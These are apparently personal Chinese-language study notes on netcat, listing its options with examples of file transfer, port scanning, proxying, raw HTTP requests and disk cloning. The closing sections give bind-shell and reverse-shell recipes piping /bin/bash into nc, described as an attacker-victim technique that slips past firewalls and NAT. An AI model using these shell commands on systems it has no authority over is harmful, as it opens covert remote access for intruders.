# Linux NetCat

参考：

https://program-think.blogspot.com/2019/09/Netcat-Tricks.html

> 不同的netcat版本参数不同

## 概述

nc (Netcat)，是一款网络工具，用于主动与套接字建立连接

 Common uses include:

   ·   simple TCP proxies
   ·   shell-script based HTTP clients and servers
   ·   network daemon testing
   ·   a SOCKS or HTTP ProxyCommand for ssh(1)
   ·   and much, much more

pattern：`nc [option] destination port`

可以用空格分开多个端口，或是使用短横号

## 参数

- `-l`

  指定netcat是监听传入的连接，而不是发起与远程主机的连接。如果没有指定端口，默认随机开启一个端口

- `-n`

  不对域名做DNS解析

- `-p`

  指定netcat本地使用的端口

- `-s`

  如果有多IP，指定发送数据的IP

- `-v`

  输出详细内容

- `-u`

  使用udp协议，默认使用tcp

- `-w`

  指定多少空闲时间之后端口连接

- `-X proxy_protocal`

  指定代理服务器使用的协议，默认使用SOCKS5

  5代表SOCKS5，4代表SOCKS4，connect代表HTTPS

- `-x proxy_address:[port]`

  指定代理使用的地址

- `-z`

  一般用于端口扫描，不进行传输层连接

- `-k`

  监听多个连接

- `-e`

  有些版本没有`-e`参数，==但是任然可以通过管道符来执行命令，因为nc使用输入流==

  ```
  #server side
  root in /tmp λ ll  | nc -l 10086
  
  #client side
  root in /opt/test λ nc 8.135.0.171 10086
  .rw-r--r-- root root 766 B  Thu Jan  7 20:54:22 2021 1
  .rw-r--r-- root root   3 B  Thu Jan  7 15:19:02 2021 CmsGoAgent.pid
  |rw-r--r-- root root   0 B  Thu Jan  7 20:48:05 2021 pipe2
  drwx------ root root   4 KB Thu Jan  7 15:58:03 2021 systemd-private-15d3cb8fbace4e55b6e68bdfecdc488e-apache2.service-4X20kz
  drwx------ root root   4 KB Thu Jan  7 15:19:02 2021 systemd-private-15d3cb8fbace4e55b6e68bdfecdc488e-chrony.service-OueTdJ
  drwx------ root root   4 KB Thu Jan  7 15:18:59 2021 systemd-private-15d3cb8fbace4e55b6e68bdfecdc488e-systemd-resolved.service-D22I1S
  ```

## example

1. 建立两台主机的连接，nc不关心那一台是服务器还是客服端。两端都会显示内容

   ```
   host1
   root in ~ λ nc -l 10086
   
   echo a
   echo b
   cd /etc	
   pwd
   echo $SHELL
   
   host2
   root in /etc λ nc 8.135.0.171 10086
   
   echo a
   echo b
   cd /etc	
   pwd
   echo $SHELL  
   ```

2. 通过nc传输内容，传输完成后会自动关闭连接。==不经过应用层==

   ```
   #server side
   root in /opt λ nc -l 10086 >  test.txt #nc将接受到内容写入文件
   
   
   #client side
   root in /etc λ nc 8.135.0.171 10086 < ~/.ssh/id_rsa.pub 
   ```

3. 测试端口是否开放

   ```
   root in /etc λ nc -nvz 8.135.0.171 443 80
   (UNKNOWN) [8.135.0.171] 443 (https) open
   (UNKNOWN) [8.135.0.171] 80 (http) open     
   
   ```

4. 使用代理服务器

   通过`socks5://10.2.3.4:8080`访问host.example.com的42端口

   ```
   nc -x 10.2.3.4:8080 -X connect host.example.com 42
   ```

5. 使用netcat访问网站，这样会发送一条请求指定IP的端口

   ==这样不会暴露浏览器信息，这里必须要有line feed和carriage return==

   ```
   root in /etc λ echo -e "GET / HTTP/1.0\r\n" | nc -v -w 3 39.156.69.79 80 
   39.156.69.79: inverse host lookup failed: Unknown host
   (UNKNOWN) [39.156.69.79] 80 (http) open
   HTTP/1.1 200 OK
   Date: Thu, 07 Jan 2021 11:23:17 GMT
   Server: Apache
   Last-Modified: Tue, 12 Jan 2010 13:48:00 GMT
   ETag: "51-47cf7e6ee8400"
   Accept-Ranges: bytes
   Content-Length: 81
   Cache-Control: max-age=86400
   Expires: Fri, 08 Jan 2021 11:23:17 GMT
   Connection: Close
   Content-Type: text/html
   
   <html>
   <meta http-equiv="refresh" content="0;url=http://www.baidu.com/">
   ```

   ```
   C:\Users\82341>echo -e "GET / HTTP1.0\r\n" | ncat  baid.com 80
   HTTP/1.1 400 Bad Request
   Server: nginx/1.10.3 (Ubuntu)
   Date: Sat, 06 Feb 2021 08:22:47 GMT
   Content-Type: text/html
   Content-Length: 182
   Connection: close
   
   <html>
   <head><title>400 Bad Request</title></head>
   <body bgcolor="white">
   <center><h1>400 Bad Request</h1></center>
   <hr><center>nginx/1.10.3 (Ubuntu)</center>
   </body>
   </html>
   ```

   

6. 使用nc备份整个磁盘

   ```
   recv  接收端
   nc -l -p xxx | dd of=/dev/sdb
   
   send 发送端
   dd if=/dev/sda | nc x.x.x.x xxx 
   ```

7. 远程使用命令

   使用这种方式会在服务端显示交互的shell，不具备隐蔽性

   ```
   #server side
   root in /tmp λ nc -l 10086 | /bin/bash -i 2&>1
   123
   
   #client side
   root in /usr/local/\ λ nc 8.135.0.171 10086
   echo 123
   ```

## 被动连接

==远程执行命令==，所有服务端的内容将在客户端显示。这种方式能被防火墙拦截

```
server side 服务端
root in /tmp λ mkfifo /tmp/pipe2
root in /tmp λ cat /tmp/pipe2 | /bin/bash -i 2&>1  | nc -l 10086 > /tmp/pipe2 
#第一次执行空内容这里表示nc server 接受nc client 输入的内容写入到具名管道符pipe2，然后从pipe2中读取内容执行


client side 客户端
root in /opt/test λ nc 8.135.0.171 10086
```

## 主动连接

与被动连接类似，唯一的差别在于把客户端与服务端对调。也就是所攻击者的nc充当服务器，受害者的nc充当客户端。受害者的nc无需开启监听端口，==所以不受防火墙和NAT的影响==

```
#client side
nc -lk -p xxx

#server side
/bin/bash -i 2 &> 1 | nc x.x.x.x xxx
```

## 被动连接VS主动连接

**被动连接**

由于绝大数PC都处于内网（未分配公网IP）。攻击者需要与受害者在同一局域网，才能建立通信。服务端需要显示开启监听端口，很容易引起用户怀疑。

**主动连接**

主动连接，没有这种种弊端